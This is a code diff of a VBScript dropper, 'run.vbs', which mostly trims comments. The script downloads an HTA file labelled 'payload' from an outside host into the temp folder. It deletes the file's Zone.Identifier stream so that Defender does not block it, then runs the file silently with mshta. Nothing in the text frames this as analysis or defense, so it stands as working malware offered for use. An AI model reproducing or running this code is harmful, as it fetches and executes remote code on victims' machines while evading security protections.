@@ -1,4 +1,3 @@
-' run.vbs
 Dim xh, fso, sh, path
 Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
 Set fso = CreateObject("Scripting.FileSystemObject")
@@ -6,9 +5,9 @@ Set sh = CreateObject("WScript.Shell")
 
 path = sh.ExpandEnvironmentStrings("%TEMP%") & "\payload.hta"
 
-' Download the HTA payload
 xh.Open "GET", "https://dicerigx.app/", False
 xh.Send
+
 If xh.Status = 200 Then
     Dim st : Set st = CreateObject("ADODB.Stream")
     st.Type = 1
@@ -17,12 +16,11 @@ If xh.Status = 200 Then
     st.SaveToFile path, 2
     st.Close
     
-    ' Strip the MOTW (Zone.Identifier) so Defender doesn't block mshta
-    Dim zoneFile : zoneFile = path & ":Zone.Identifier"
+    ' Strip MOTW
     On Error Resume Next
-    fso.DeleteFile zoneFile, True
+    fso.DeleteFile path & ":Zone.Identifier", True
     On Error GoTo 0
     
-    ' Execute the HTA
+    ' Force mshta to run the local file
     sh.Run "mshta.exe """ & path & """", 0, False
 End If
